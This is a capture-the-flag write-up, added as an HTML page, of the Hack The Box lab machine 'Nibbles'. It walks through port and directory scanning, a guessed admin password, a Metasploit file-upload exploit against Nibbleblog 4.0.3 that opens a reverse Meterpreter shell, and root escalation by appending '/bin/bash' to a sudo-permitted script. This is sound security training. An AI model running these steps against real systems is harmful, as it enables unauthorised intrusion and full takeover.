@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Project Details - Your Project Name</title>
+    <link rel="stylesheet" href="./writeup_style.css">
+</head>
+<body>
+
+    
+    <!-- Canvas for the Matrix effect -->
+    <canvas id="matrixCanvas"></canvas>
+
+    <!-- Main content container -->
+    <div class="content">
+        <!-- Header -->
+        <div class="header">
+            <h1>Nibbles</h1>
+
+            <p>22-08-2024 23:17 pm</p>
+            <p>Tags: </p>
+            <p>References: <a href="https://app.hackthebox.com/machines/Nibbles">https://app.hackthebox.com/machines/Nibbles</a></p>
+            <h1 id="nibbles">Nibbles</h1>
+            <ul>
+            <li>nmap initial scan to see services</li>
+            </ul>
+            <pre><code><span class="hljs-selector-attr">[2024-08-22 16:28]</span> <span class="hljs-selector-tag">root</span>@<span class="hljs-selector-tag">kali</span>:/<span class="hljs-selector-tag">home</span>/<span class="hljs-selector-tag">kali</span>/<span class="hljs-selector-tag">Desktop</span>/<span class="hljs-selector-tag">HTB_Machines</span>/<span class="hljs-selector-tag">Nibbles</span> # <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-sV</span> <span class="hljs-selector-tag">-oN</span> <span class="hljs-selector-tag">initial</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.75</span> 
+            <span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-selector-tag">7</span><span class="hljs-selector-class">.94SVN</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-08-22 16:28 EDT</span>
+            Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">10.75</span>
+            Host is up (<span class="hljs-number">0.19s</span> latency).
+            Not <span class="hljs-attribute">shown</span>: <span class="hljs-number">998</span> closed tcp ports (reset)
+            PORT   STATE SERVICE VERSION
+            <span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">2</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+            | <span class="hljs-attribute">ssh-hostkey</span>: 
+            |   <span class="hljs-number">2048</span> <span class="hljs-attribute">c4</span>:<span class="hljs-attribute">f8</span>:<span class="hljs-attribute">ad</span>:<span class="hljs-attribute">e8</span>:<span class="hljs-attribute">f8</span>:<span class="hljs-number">04</span>:<span class="hljs-number">77</span>:<span class="hljs-attribute">de</span>:<span class="hljs-attribute">cf</span>:<span class="hljs-number">15</span>:<span class="hljs-number">0</span><span class="hljs-attribute">d</span>:<span class="hljs-number">63</span>:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">18</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">49</span> (RSA)
+            |   <span class="hljs-number">256</span> <span class="hljs-number">22</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">b1</span>:<span class="hljs-number">97</span>:<span class="hljs-attribute">bf</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">17</span>:<span class="hljs-number">08</span>:<span class="hljs-attribute">fc</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">2</span><span class="hljs-attribute">c</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">e9</span>:<span class="hljs-number">77</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> (ECDSA)
+            |_  <span class="hljs-number">256</span> <span class="hljs-attribute">e6</span>:<span class="hljs-attribute">ac</span>:<span class="hljs-number">27</span>:<span class="hljs-attribute">a3</span>:<span class="hljs-attribute">b5</span>:<span class="hljs-attribute">a9</span>:<span class="hljs-attribute">f1</span>:<span class="hljs-number">12</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-number">34</span>:<span class="hljs-attribute">a5</span>:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">eb</span>:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:e9 (ED25519)
+            <span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((Ubuntu))
+            |<span class="hljs-attribute">_http-title</span>: Site doesn't have a title (text/html).
+            |<span class="hljs-attribute">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (Ubuntu)
+            Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OS</span>: Linux; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel
+            
+            Service detection performed. Please report any incorrect results at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span>
+            Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">26.96</span> seconds
+            </code></pre><ul>
+            <li><p>we initially see 2 services: ssh and http</p>
+            </li>
+            <li><p>let&#39;s see the http one</p>
+            </li>
+            </ul>
+            <p>![[Pasted image 20240822233300.png]]</p>
+            <ul>
+            <li><p>we are greeted by a custom message</p>
+            </li>
+            <li><p>let&#39;s try curling the page
+            ```
+            [2024-08-22 16:29] root@kali:/home/kali/Desktop/HTB_Machines/Nibbles # curl <a href="http://10.10.10.75/">http://10.10.10.75/</a> 
+            <b>Hello world!</b></p>
+            </li>
+            </ul>
+            <!-- /nibbleblog/ directory. Nothing interesting here! -->
+            <pre><code>
+            - we notice that we are given a directory <span class="hljs-keyword">to</span> follow
+            
+            ![[Pasted image <span class="hljs-number">20240822233828.</span>png]]
+            
+            - <span class="hljs-keyword">let</span>'s <span class="hljs-keyword">try</span> enumerating the website <span class="hljs-keyword">with</span> gobuster <span class="hljs-keyword">and</span> a common list
+            </code></pre><p>gobuster dir -u <a href="http://10.10.10.75/nibbleblog/">http://10.10.10.75/nibbleblog/</a> -w /usr/share/wordlists/dirb/common.txt</p>
+            <pre><code>
+            - <span class="hljs-keyword">after</span> enumeration we have <span class="hljs-keyword">the</span> following results:
+            </code></pre><p>/.hta                 (Status: 403) [Size: 301]
+            /.htaccess            (Status: 403) [Size: 306]
+            /.htpasswd            (Status: 403) [Size: 306]
+            /admin                (Status: 301) [Size: 321] [--&gt; <a href="http://10.10.10.75/nibbleblog/admin/">http://10.10.10.75/nibbleblog/admin/</a>]
+            /admin.php            (Status: 200) [Size: 1401]
+            /content              (Status: 301) [Size: 323] [--&gt; <a href="http://10.10.10.75/nibbleblog/content/">http://10.10.10.75/nibbleblog/content/</a>]
+            /index.php            (Status: 200) [Size: 2987]
+            /languages            (Status: 301) [Size: 325] [--&gt; <a href="http://10.10.10.75/nibbleblog/languages/">http://10.10.10.75/nibbleblog/languages/</a>]
+            /plugins              (Status: 301) [Size: 323] [--&gt; <a href="http://10.10.10.75/nibbleblog/plugins/">http://10.10.10.75/nibbleblog/plugins/</a>]
+            /README               (Status: 200) [Size: 4628]
+            /themes               (Status: 301) [Size: 322] [--&gt; <a href="http://10.10.10.75/nibbleblog/themes/">http://10.10.10.75/nibbleblog/themes/</a>]</p>
+            <pre><code>
+            - let<span class="hljs-symbol">'s</span> search inside each one
+            - <span class="hljs-keyword">when</span> entering the /README directory we can gate <span class="hljs-keyword">some</span> information about the service
+            </code></pre><p>====== Nibbleblog ======
+            Version: v4.0.3
+            Codename: Coffee
+            Release date: 2014-04-01</p>
+            <pre><code>
+            -<span class="ruby"> <span class="hljs-keyword">next</span> we search /admin.php
+            </span>![[Pasted image 20240822234729.png]]
+            
+            -<span class="ruby"> <span class="hljs-keyword">for</span> now we won<span class="hljs-string">'t guess because we might get blacklisted
+            </span></span>
+            -<span class="ruby"><span class="hljs-string"> searching the /content directory we stumble across some data
+            </span></span>![[Pasted image 20240822234909.png]]
+            -<span class="ruby"><span class="hljs-string"> from this, we now know that the username is admin for the login page
+            </span></span>
+            -<span class="ruby"><span class="hljs-string"> we guess that the password might be nibbles....
+            </span></span>![[Pasted image 20240822235437.png]]
+            -<span class="ruby"><span class="hljs-string"> and we were right, yay
+            </span></span>
+            -<span class="ruby"><span class="hljs-string"> we got access to the admin'</span>s dashboard but all we could <span class="hljs-keyword">do</span> is mess a bit with the website
+            </span>-<span class="ruby"> but we want a shell so we launch msfconsole
+            </span>
+            -<span class="ruby"> from the /README file we know the version so we can start there
+            </span>-<span class="ruby"> msfconsole has an exploit <span class="hljs-keyword">for</span> nibbleblog_file_upload but we don<span class="hljs-string">'t know that it'</span>s the correct version so we <span class="hljs-keyword">do</span> some more research <span class="hljs-keyword">for</span> our version
+            </span>-<span class="ruby"> we stumble across CVE-<span class="hljs-number">2015</span>-<span class="hljs-number">6967</span>, arbitrary file upload which is what we have <span class="hljs-keyword">in</span> msfconsole
+            </span>-<span class="ruby"> <span class="hljs-keyword">next</span>, we configure the payload....</span>
+            </code></pre><h1 id="matching-modules">Matching Modules</h1>
+            <h1 id="name-disclosure-date-rank-check-description">Name                                       Disclosure Date  Rank       Check  Description</h1>
+            <hr>
+            <p>   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability</p>
+            <p>Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload</p>
+            <p>msf6 &gt; use 0
+            [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+            msf6 exploit(multi/http/nibbleblog_file_upload) &gt; show options</p>
+            <p>Module options (exploit/multi/http/nibbleblog_file_upload):</p>
+            <p>   Name       Current Setting  Required  Description</p>
+            <hr>
+            <p>   PASSWORD                    yes       The password to authenticate with
+               Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+               RHOSTS                      yes       The target host(s), see <a href="https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html">https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</a>
+               RPORT      80               yes       The target port (TCP)
+               SSL        false            no        Negotiate SSL/TLS for outgoing connections
+               TARGETURI  /                yes       The base path to the web application
+               USERNAME                    yes       The username to authenticate with
+               VHOST                       no        HTTP server virtual host</p>
+            <p>Payload options (php/meterpreter/reverse_tcp):</p>
+            <p>   Name   Current Setting  Required  Description</p>
+            <hr>
+            <p>   LHOST  192.168.0.235    yes       The listen address (an interface may be specified)
+               LPORT  4444             yes       The listen port</p>
+            <p>Exploit target:</p>
+            <p>   Id  Name</p>
+            <hr>
+            <p>   0   Nibbleblog 4.0.3</p>
+            <p>msf6 exploit(multi/http/nibbleblog_file_upload) &gt; set PASSWORD nibbles
+            PASSWORD =&gt; nibbles
+            msf6 exploit(multi/http/nibbleblog_file_upload) &gt; set RHOSTS 10.10.10.75
+            RHOSTS =&gt; 10.10.10.75
+            msf6 exploit(multi/http/nibbleblog_file_upload) &gt; set USERNAME admin
+            USERNAME =&gt; admin
+            msf6 exploit(multi/http/nibbleblog_file_upload) &gt; set LHOST 10.10.16.5
+            LHOST =&gt; 10.10.16.5
+            msf6 exploit(multi/http/nibbleblog_file_upload) &gt; show options</p>
+            <p>msf6 exploit(multi/http/nibbleblog_file_upload) &gt; run</p>
+            <p>[<em>] Started reverse TCP handler on 10.10.16.5:4444 
+            [</em>] Sending stage (39927 bytes) to 10.10.10.75
+            [+] Deleted image.php
+            [*] Meterpreter session 1 opened (10.10.16.5:4444 -&gt; 10.10.10.75:35456) at 2024-08-22 17:12:01 -0400</p>
+            <p>meterpreter &gt; getuid
+            Server username: nibbler
+            meterpreter &gt; sysinfo
+            Computer    : Nibbles
+            OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64
+            Meterpreter : php/linux</p>
+            <pre><code>-<span class="ruby"> we can see that we are nibbler user <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> root
+            </span>-<span class="ruby"> first off, let<span class="hljs-string">'s create a shell (just write shell in meterpreter)
+            </span></span>-<span class="ruby"><span class="hljs-string"> from here we could escalate privileges
+            </span></span>-<span class="ruby"><span class="hljs-string"> we can see that the system has python3</span></span>
+            </code></pre><p>which python3
+            /usr/bin/python3</p>
+            <pre><code>- next we spawn an interactive shell....
+            </code></pre><p>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p>
+            <pre><code>- we got the user.txt flag....
+            </code></pre><p>nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd ~</p>
+            <p>&lt;ml/nibbleblog/content/private/plugins/my_image$ cd ~<br>nibbler@Nibbles:/home/nibbler$ ls
+            ls
+            personal.zip  user.txt
+            nibbler@Nibbles:/home/nibbler$ cat user.txt</p>
+            <pre><code>- we see <span class="hljs-keyword">that</span> we may <span class="hljs-built_in">run</span> monitor.sh....
+            </code></pre><p>nibbler@Nibbles:/home/nibbler$ sudo -l
+            sudo -l
+            Matching Defaults entries for nibbler on Nibbles:
+                env_reset, mail_badpass,
+                secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</p>
+            <p>User nibbler may run the following commands on Nibbles:
+                (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</p>
+            <pre><code>- we can modify <span class="hljs-keyword">the</span> monitor.sh <span class="hljs-keyword">script</span> <span class="hljs-keyword">and</span> echo <span class="hljs-keyword">into</span> <span class="hljs-keyword">it</span> <span class="hljs-string">"/bin/bash"</span> <span class="hljs-keyword">in</span> order <span class="hljs-keyword">to</span> escalate privileges
+            </code></pre><p>nibbler@Nibbles:/home/nibbler/personal/stuff$ echo &quot;/bin/bash&quot; &gt;&gt; monitor.sh
+            echo &quot;/bin/bash&quot; &gt;&gt; monitor.sh
+            nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh 
+            sudo ./monitor.sh
+            &#39;unknown&#39;: I need something more specific.
+            /home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
+            /home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
+            /home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
+            root@Nibbles:/home/nibbler/personal/stuff# whoami
+            whoami
+            root
+            root@Nibbles:/home/nibbler/personal/stuff# cd ~
+            cd ~
+            root@Nibbles:~# ls
+            ls
+            root.txt
+            ```</p>
+            <h1 id="useful-links-">Useful Links:</h1>
+            
+
+        <!-- Back to Index Link -->
+        <a href="./index.html" class="back-link">Back to Index</a>
+    </div>
+
+    <script src="./matrix.js"></script>
+</body>
+</html>
